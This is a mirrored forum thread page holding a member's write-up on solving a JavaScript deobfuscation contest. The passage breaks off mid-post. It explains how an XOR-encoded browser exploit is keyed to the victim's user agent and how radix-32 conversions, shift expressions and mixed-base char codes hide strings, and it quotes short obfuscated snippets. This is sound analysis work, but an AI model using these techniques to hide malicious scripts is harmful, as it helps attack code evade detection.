<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/showthread.php?t=1516 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:31:09 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->

	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<meta content="index.html" id="e_vb_meta_bburl" name="vb_meta_bburl"/>
<base/><!--[if IE]></base><![endif]-->
<meta content="vBulletin 4.2.1" name="generator"/>
<meta content="IE=9" http-equiv="X-UA-Compatible"/>

	<link href="favicon.ico" rel="Shortcut Icon" type="image/x-icon"/>






	<meta content="170793809601191" property="fb:app_id"/>
<meta content="Garage4hackers Forum" property="og:site_name"/>
<meta content="Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research." property="og:description"/>
<meta content="showthread860e.html?t=1516" property="og:url"/>
<meta content="article" property="og:type"/>




	
		<script src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js" type="text/javascript"></script>
	

<script type="text/javascript">
<!--
	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
	{
		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
		var yuipath = 'clientscript/yui';
		var yuicombopath = '';
		var remoteyui = false;
	}
	else	// Load Rest of YUI remotely (where possible)
	{
		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
		var remoteyui = true;
		if (!yuicombopath)
		{
			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
		}
	}
	var SESSIONURL = "";
	var SECURITYTOKEN = "guest";
	var IMGDIR_MISC = "images/misc";
	var IMGDIR_BUTTON = "images/buttons";
	var vb_disable_ajax = parseInt("0", 10);
	var SIMPLEVERSION = "421";
	var BBURL = "index.html";
	var LOGGEDIN = 0 > 0 ? true : false;
	var THIS_SCRIPT = "showthread";
	var RELPATH = "showthread860e.html?t=1516";
	var PATHS = {
		forum : "",
		cms   : "",
		blog  : ""
	};
	var AJAXBASEURL = "index.html";
// -->
</script>
<script src="clientscript/vbulletin-core6719.js?v=421" type="text/javascript"></script>



	<link href="external9476.php?type=RSS2" rel="alternate" title="Garage4hackers Forum RSS Feed" type="application/rss+xml"/>
	
		<link href="external2471.php?type=RSS2&amp;forumids=24" rel="alternate" title="Garage4hackers Forum - Reverse Engineering and Application Cracking - RSS Feed" type="application/rss+xml"/>
	



	<link href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," rel="stylesheet" type="text/css"/>

	<!--[if lt IE 8]>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
	<![endif]-->


	<meta content="tnyrzqxb, javascript, ubeth, return, decoded, function, vulnerability, deobfuscation, code, challenge, provide, gvmdcqvwmjcdd[rrattnsjjuao], lcxiyjztrskyzvgvmdcqvwmjcdd[rrattnsjjuao], forzjrkieirxmcrnqq, rrattnsjjuao++, gvmdcqvwmjcdd.length, rrattnsjjuao, zjrkieirxmcrnqq, tnyrzqxb.length, document.writekeqtld, keqtld, zjrkieirxmcrnqq++, asked, heap, http://www.breakingpointsystems.com/community/blog/javascript-obfuscations-contest-winner, breakingpoint, winner, glad, successful, forward, challenges, list, entrants, contest, forrrattnsjjuao, overflow, remote, exploit, browser, details, found, obfuscations, result, tnyrzqxb.pushztajehbe, technique, obfuscated, section, extended, heavily, point" name="keywords"/>
	<meta content="I decided to take some time out and prepare a detailed write up on how I went about solving the JavaScript Deobfuscation Challenge posted on BreakingPoint Systems' Blog recently. 
 
You can read more about the contest and the scenario given in the challenge here: 
 
http://www.breakingpointsystems.com/community/blog/javascript-obfuscations-contest/ 
 
First off, I would like to thank Ricky for setting up this challenge. It was interesting and it really makes you think beyond the normal" name="description"/>

	<title> JavaScript Deobfuscation Challange on Breaking Point</title>
	<link href="showthread860e.html?t=1516" rel="canonical"/>
	
	<script src="clientscript/vbulletin_textedit6719.html?v=421" type="text/javascript"></script>
	<script src="clientscript/vbulletin_post_loader6719.html?v=421" type="text/javascript"></script>
	
	
	
	
	
	

	
		<link href="css8d9b.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postlist.css,showthread.css,postbit.css,attachment.css,poll.css,lightbox.css" rel="stylesheet" type="text/css"/>
	

<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>

</head>

<body>

<div class="above_body"> <!-- closing tag is in template navbar -->
<div class="floatcontainer doc_header" id="header">
	<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
	<div class="toplinks" id="toplinks">
		
			<ul class="nouser">
			
				<li><a href="register.html" rel="nofollow">Register</a></li>
			
				<li><a href="faq.html" rel="help">Help</a></li>
				<li>
			<script src="clientscript/vbulletin_md56719.html?v=421" type="text/javascript"></script>
			<form action="../external.html?link=http://garage4hackers.com/login.php?do=login" id="navbar_loginform" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
				<fieldset class="logindetails" id="logindetails">
					<div>
						<div>
					<input accesskey="u" class="textbox default-value" id="navbar_username" name="vb_login_username" size="10" tabindex="101" type="text" value="User Name"/>
					<input class="textbox" id="navbar_password" name="vb_login_password" size="10" tabindex="102" type="password"/>
					<input class="textbox default-value" id="navbar_password_hint" name="vb_login_password_hint" size="10" style="display:none;" tabindex="102" type="text" value="Password"/>
					<input accesskey="s" class="loginbutton" tabindex="104" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." type="submit" value="Log in"/>
						</div>
					</div>
				</fieldset>
				<div class="remember" id="remember">
					<label for="cb_cookieuser_navbar"><input accesskey="c" class="cb_cookieuser_navbar" id="cb_cookieuser_navbar" name="cookieuser" tabindex="103" type="checkbox" value="1"/> Remember Me?</label>
				</div>

				<input name="s" type="hidden" value=""/>
				<input name="securitytoken" type="hidden" value="guest"/>
				<input name="do" type="hidden" value="login"/>
				<input name="vb_login_md5password" type="hidden"/>
				<input name="vb_login_md5password_utf" type="hidden"/>
			</form>
			<script type="text/javascript">
			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
			vB_XHTML_Ready.subscribe(function()
			{
			//
				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
			});
			
			function navbar_username_focus(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == 'User Name')
				{
				//
					textbox.value='';
					textbox.style.color='#000000';
				}
			}

			function navbar_username_blur(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == '')
				{
				//
					textbox.value='User Name';
					textbox.style.color='#777777';
				}
			}
			
			function navbar_password_hint(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
				YAHOO.util.Dom.get('navbar_password').focus();
			}

			function navbar_password(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				if (textbox.value == '')
				{
					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
				}
			}
			</script>
				</li>
				
					<li class="hidden" id="fb_headerbox">

	<a href="#" id="fb_loginbtn"><img alt="The Facebook Platform" src="images/misc/facebook_login.gif"/></a>

</li>

				
			</ul>
		
	</div>
	<div class="ad_global_header">
		 
		 
	</div>
	<hr/>
</div>
<div class="navbar" id="navbar">
	<ul class="navtabs floatcontainer" id="navtabs">
		
		
	
		<li id="vbtab_whatsnew">
			<a class="navtab" href="activity.html">What's New?</a>
		</li>
		
		

	
		<li id="vbtab_cms">
			<a class="navtab" href="content.html">Articles</a>
		</li>
		
		

	
		<li class="selected" id="vbtab_forum">
			<a class="navtab" href="forum.html">Forum</a>
		</li>
		
		
			<ul class="floatcontainer">
				
					
						
							<li id="vbflink_newposts"><a href="search8427.html?do=getnew&amp;contenttype=vBForum_Post">New Posts</a></li>
						
					
				
					
						
							<li id="vbflink_faq"><a href="faq.html">FAQ</a></li>
						
					
				
					
						
							<li id="vbflink_calendar"><a href="calendar.html">Calendar</a></li>
						
					
				
					
						<li class="popupmenu" id="vbmenu_community">
							<a class="popupctrl" href="javascript://">Community</a>
							<ul class="popupbody popuphover">
								
									<li id="vbclink_members"><a href="memberlist.html">Member List</a></li>
								
							</ul>
						</li>
					
				
					
						<li class="popupmenu" id="vbmenu_actions">
							<a class="popupctrl" href="javascript://">Forum Actions</a>
							<ul class="popupbody popuphover">
								
									<li id="vbalink_mfr"><a href="forum.html?do=markread&amp;markreadhash=guest">Mark Forums Read</a></li>
								
							</ul>
						</li>
					
				
					
						<li class="popupmenu" id="vbmenu_qlinks">
							<a class="popupctrl" href="javascript://">Quick Links</a>
							<ul class="popupbody popuphover">
								
									<li id="vbqlink_posts"><a href="search2791.html?do=getdaily&amp;contenttype=vBForum_Post">Today's Posts</a></li>
								
									<li id="vbqlink_leaders"><a href="showgroups.html">View Site Leaders</a></li>
								
							</ul>
						</li>
					
				
			</ul>
		

	
		<li id="vbtab_blog">
			<a class="navtab" href="blog.html">Blogs</a>
		</li>
		
		

	
		<li id="tab_nja4_357">
			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
		</li>
		
		

	
		<li id="tab_nta0_579">
			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
		</li>
		
		

	
		<li id="tab_nta0_442">
			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
		</li>
		
		

		<li>
            <a class="navtab" href="pages.html">Events and Conferences</a></li>
	</ul>
	
		<div class="globalsearch" id="globalsearch">
			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" class="navbar_search" id="navbar_search" method="post">
				
				<input name="securitytoken" type="hidden" value="guest"/>
				<input name="do" type="hidden" value="process"/>
				<span class="textboxcontainer"><span><input class="textbox" name="query" tabindex="99" type="text" value=""/></span></span>
				<span class="buttoncontainer"><span><input class="searchbutton" name="submit" onclick="document.getElementById('navbar_search').submit;" src="images/buttons/search.html" tabindex="100" type="image"/></span></span>
			</form>
			<ul class="navbar_advanced_search">
				<li><a accesskey="4" href="search.html">Advanced Search</a></li>
				
			</ul>
		</div>
	
</div>
</div><!-- closing div for above_body -->

<div class="body_wrapper">
<div class="breadcrumb" id="breadcrumb">
	<ul class="floatcontainer">
		<li class="navbithome"><a accesskey="1" href="content.html"><img alt="Home" src="images/misc/navbit-home.png"/></a></li>
		
	<li class="navbit"><a href="forum.html">Forum</a></li>

	<li class="navbit"><a href="forumdisplayffeb.html?f=20">Experts Forum</a></li>

	<li class="navbit"><a href="forumdisplay345c.html?f=24">Reverse Engineering and Application Cracking</a></li>

		
	<li class="navbit lastnavbit"><span> JavaScript Deobfuscation Challange on Breaking Point</span></li>

	</ul>
	<hr/>
</div>


<div style="width:728px; margin:0 auto; padding-bottom:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 728;
google_ad_height = 15;
google_ad_format = "728x15_0ads_al_s";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script>
</div>

<div id="ad_global_below_navbar"><script async="" src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- garage1 -->
<ins class="adsbygoogle" data-ad-client="ca-pub-6847984837250662" data-ad-slot="4036513682" style="display:inline-block;width:728px;height:90px"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>


	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" class="notices" id="notices" method="post">
		<input name="do" type="hidden" value="dismissnotice"/>
		<input name="s" type="hidden" value=""/>
		<input name="securitytoken" type="hidden" value="guest"/>
		<input id="dismiss_notice_hidden" name="dismiss_noticeid" type="hidden" value=""/>
		<input name="url" type="hidden" value=""/>
		<ol>
			<li class="restore" id="navbar_notice_2">
	
	
<h2>
The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 


</h2>

<!-- Mirrored from garage4hackers.com/showthread.php?t=1516 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:31:09 GMT -->

</li>
		</ol>
	</form>





	<div class="above_postlist" id="above_postlist">
		

		<div class="pagination_top" id="pagination_top">
		
			<div class="postpagestats" id="postpagestats_above">
				Results 1 to 6 of 6
			</div>
		</div>
	</div>
<div class="pagetitle" id="pagetitle">
	<h1>
		Thread: <span class="threadtitle"><a href="showthread860e.html?t=1516" title="Reload this Page">JavaScript Deobfuscation Challange on Breaking Point</a></span>

<a class="a2a_dd" href="http://www.addtoany.com/share_save"><img alt="Share/Save - My123World.Com!" border="0" height="16" src="../static.addtoany.com/buttons/share_save_171_16.png" width="171"/></a><script type="text/javascript">a2a_show_title=1;a2a_num_services=14;</script><script src="../static.addtoany.com/menu/page.js" type="text/javascript"></script>

		
			
<fb:like action="../external.html?link=http://garage4hackers.com/like" colorscheme="light" font="tahoma" href="showthread860e.html?t=1516" layout="standard" show_faces="false" width="260"></fb:like>
		
	</h1>
</div>
	<div class="thread_controls" id="thread_controls">
		<div>
		<ul class="postlist_popups popupgroup" id="postlist_popups">
			
			<li class="popupmenu" id="threadtools">
				<h6><a class="popupctrl" href="javascript://">Thread Tools</a></h6>
				<ul class="popupbody popuphover">
					<li><a accesskey="3" href="printthreada705.html?t=1516&amp;pp=10&amp;page=1" rel="nofollow">Show Printable Version</a></li>
					<li><a href="sendmessageca9d.html?do=sendtofriend&amp;t=1516" rel="nofollow">Email this Page…</a></li>
					<li>
						
							<a href="subscriptiondb2f.html?do=addsubscription&amp;t=1516" rel="nofollow">Subscribe to this Thread…</a>
											
					</li>
					
				</ul>
			</li>

			

			
				<li class="popupmenu searchthread" id="searchthread">
					<h6><a class="popupctrl" href="javascript://">Search Thread</a></h6>
					<form action="../external.html?link=http://garage4hackers.com/search.php" method="post">
						<ul class="popupbody popuphover">
							<li>
								<input class="searchbox" name="query" tabindex="13" type="text" value="Search..."/>
								<input class="button" tabindex="14" type="submit" value="Search"/>
							</li>
							<li class="formsubmit">
								<div><a class="advancedsearchlink" href="search6b88.html?search_type=1&amp;searchthreadid=1516&amp;contenttype=vBForum_Post">Advanced Search</a></div>
							</li>
						</ul>
						<input name="s" type="hidden" value=""/>
						<input name="securitytoken" type="hidden" value="guest"/>
						<input name="do" type="hidden" value="process"/>
						<input name="searchthreadid" type="hidden" value="1516"/>
						<input name="search_type" type="hidden" value="1"/>
						<input name="contenttype" type="hidden" value="vBForum_Post"/>

					</form>
				</li>
			

			

			
				<li class="popupmenu" id="displaymodes">
					<h6><a class="popupctrl" href="javascript://">Display</a></h6>
					<ul class="popupbody popuphover">
						<li><a href="showthread75df.html?t=1516&amp;p=5752&amp;mode=linear#post5752"> Switch to Linear Mode</a></li>
						<li><a href="showthread7076.html?t=1516&amp;mode=hybrid"> Switch to Hybrid Mode</a></li>
						<li><label>Threaded Mode</label></li>
					</ul>
				</li>
			

			
		</ul>
		</div>
	</div>

<div class="postlist restrain" id="postlist">
	
		<script type="text/javascript">
<!--
var imgdir_statusicon = "images/statusicon";
var imgdir_misc = "images/misc";
var cleargifurl = "clear.gif";
var guestphrase = "Guest";
var morephrase = "More replies below current depth...";
var highlightwords = "";
//-->
</script>

<script src="clientscript/vbulletin_thrdpostlist6719.html?v=421" type="text/javascript"></script>

<script type="text/javascript">
<!--
// initialize some variables
var curpostid = 5752;
var quickreply = false;

// cached posts (no page reload required to view)
pd[5752] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_5752">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">09-21-2011,&nbsp;<span class="time">08:37 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post5752" href="showthread.php?t=1516&amp;p=5752&amp;viewfull=1#post5752" class="postcounter">#1</a><a id="postcount5752" name="1"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=311" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=311" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="c0d3inj3cT is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_5752_311" title="c0d3inj3cT will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Dec 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>67</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=311">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n				<h2 class="title icon">\r\n					JavaScript Deobfuscation Challange on Breaking Point\r\n				</h2>\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_5752">\r\n						<blockquote class="postcontent restore ">\r\n							I decided to take some time out and prepare a detailed write up on how I went about solving the JavaScript Deobfuscation Challenge posted on BreakingPoint Systems\' Blog recently.<br />\r\n<br />\r\nYou can read more about the contest and the scenario given in the challenge here:<br />\r\n<br />\r\n<a href="http://www.breakingpointsystems.com/community/blog/javascript-obfuscations-contest/" target="_blank">http://www.breakingpointsystems.com/...tions-contest/</a><br />\r\n<br />\r\nFirst off, I would like to thank Ricky for setting up this challenge. It was interesting and it really makes you think beyond the normal capabilities of JavaScript language which we most are aware of.<br />\r\n<br />\r\nAs you proceed to solve this Obfuscated JavaScript, you will uncover certain facts about JavaScript which will come to you as a surprise.<br />\r\n<br />\r\n<b>The concept:</b><br />\r\n<br />\r\nThe exploit code is encoded using XOR encoding. In order to decode this XOR encoded code, we need a passphrase. There\'s a nice concept used here.<br />\r\n<br />\r\nThe first part of the script will detect the Victim\'s User Agent and based on that will return a Random PreGenerated Passphrase.<br />\r\n<br />\r\nThis passphrase, when XOR\'ed with Encoded JavaScript, will yield the plain text.<br />\r\n<br />\r\nIt\'s not as easy at it sounds though. Keep reading to find out more about it.<br />\r\n<br />\r\nHere\'s a list of the different tricks applied in order to obfuscate the code and make it difficult for the reversers to analyse it:<br />\r\n<br />\r\n<b>Strings represented as numbers using Base Conversion with Radix 32.</b><br />\r\n<br />\r\nHere, the Radix 32 was represented as a bitwise XOR operation between 2 numbers.<br />\r\n<br />\r\nA bitwise leftshift is essentially equivalent to multiplying the number with 2 (exponent the number of leftshifts)<br />\r\n<br />\r\nSome examples:<br />\r\n<br />\r\n16&lt;&lt;1 = 16 * 2^1 = 32<br />\r\n2&lt;&lt;4 = 2 * 2^4 = 32<br />\r\n4&lt;&lt;3 = 4 * 2^3 = 32<br />\r\n<br />\r\nIn JavaScript, the toString() function is used to convert a Number to String. When supplied the radix value of 32 to this function, it essentially converts the Base to 32 from decimal.<br />\r\n<br />\r\nAn example would help to understand better.<br />\r\n<br />\r\n720094129..toString(16&lt;&lt;1)+&quot;&quot;<br />\r\n<br />\r\n720094129 is in Decimal (base 10).<br />\r\n16&lt;&lt;1 = 32 as we have already seen above.<br />\r\n<br />\r\n720094129..toString(16&lt;&lt;1)+&quot;&quot; = 720094129..toString(32)+&quot;&quot;<br />\r\n<br />\r\nWe need to find out the Base 32 value for 720094129 in Base 10.<br />\r\n<br />\r\nYou can use this site for Base Conversion:<br />\r\n<br />\r\n<a href="http://www.convertit.com/go/convertit/calculators/math/base_converter.asp" target="_blank">http://www.convertit.com/go/converti..._converter.asp</a><br />\r\n<br />\r\nThe number, 720094129 in Base 32 is equivalent to the String, length<br />\r\n<br />\r\n720094129..toString(32)+&quot;&quot;= length + &quot;&quot; = length<br />\r\n<br />\r\nRepresenting Numbers as an Expression operating on Strings.<br />\r\n<br />\r\nA clever trick was used to represent numbers, especially small numbers (0-9) as an Expression Operating on a String.<br />\r\n<br />\r\n1 could be represented as the Length of a Single Char.<br />\r\n<br />\r\n\'C\'[length] = 1<br />\r\n<br />\r\nBut we know from above analysis that the string &quot;length&quot; can also be written as: 720094129..toString(32)+&quot;&quot;<br />\r\n<br />\r\nso, \'C\'[720094129..toString(32)+&quot;&quot;] = 1<br />\r\n<br />\r\nIn the JavaScript given to us. There are several &quot;if&quot; expressions evaluated. Let\'s take one as an example and the same approach can be extended to the remaining.<br />\r\n<br />\r\nif(uUHIjMJVFJET.indexOf(String.fromCharCode(0157,1  12,0145,114,97)) != -\'Z\'[720094129..toString(16&lt;&lt;1)+&quot;&quot;])<br />\r\n<br />\r\n\'Z\'[720094129..toString(16&lt;&lt;1)+&quot;&quot;] = 1<br />\r\n<br />\r\nSo, the above &quot;if&quot; expression reduces to:<br />\r\n<br />\r\nif(uUHIjMJVFJET.indexOf(String.fromCharCode(0157,1  12,0145,114,97)) != -1)\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_5752" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_5752" class="newreply" href="newreply.php?do=newreply&amp;p=5752" rel="nofollow" title="Reply With Quote"><img id="quoteimg_5752" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
pd[5753] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_5753">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">09-21-2011,&nbsp;<span class="time">08:38 PM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post5753" href="showthread.php?t=1516&amp;p=5753&amp;viewfull=1#post5753" class="postcounter">#2</a><a id="postcount5753" name="2"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=311" title="c0d3inj3cT is offline"><strong>c0d3inj3cT</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=311" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=311&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=311" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=311" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/311-c0d3inj3cT" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="c0d3inj3cT is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Garage Member\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_5753_311" title="c0d3inj3cT will become famous soon enough">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Dec 2010</dd>\r\n					\r\n					\r\n					<dt>Posts</dt> <dd>67</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=311">2</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow">\r\n				\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_5753">\r\n						<blockquote class="postcontent restore ">\r\n							This brings us to the next step of Obfuscation.<br />\r\n<br />\r\n<b>String represented as Char Codes.</b><br />\r\n<br />\r\nChar Codes were represented in different formats, either base 10 (dec), base 8 (oct) and base 16 (hex)<br />\r\n<br />\r\nString.fromCharCode(x)<br />\r\n<br />\r\nThis JavaScript function will return the Character Corresponding to the ASCII Code, x.<br />\r\n<br />\r\nImportant thing to note here is, the number \'x\' passed as an argument to this function, should be in decimal format. It shouldn\'t be either hex or octal.<br />\r\n<br />\r\nIf we look at the above sample &quot;if&quot; expression, we can see some octal entries too.<br />\r\n<br />\r\nI wrote a short Perl Script at the time of the contest which would automatically parse a comma seperated list of a mixture of numbers in different format and convert them all to decimal (base 10) format.<br />\r\n<br />\r\nIt turned out to be really useful and saved a lot of time. As you will see later when we come to the stage of XOR decoding. This script saves a lot of time.<br />\r\n<br />\r\nFor instance,<br />\r\n<br />\r\nThere was an &quot;if&quot; expression in the obfuscated javascript as given below:<br />\r\n<br />\r\nif(uUHIjMJVFJET.indexOf(String.fromCharCode(0157,1  12,0145,114,97)) != -\'Z\'[720094129..toString(16&lt;&lt;1)+&quot;&quot;]) <br />\r\n{     <br />\r\nreturn String.fromCharCode(0x6d,0x61,0x54,0150,76,0114,01  32,113,0x50,0155,114,0x72,0x46,0x53);   <br />\r\n}<br />\r\n<br />\r\n\'Z\'[720094129..toString(16&lt;&lt;1)+&quot;&quot;] = \'Z\'[length] = 1<br />\r\n<br 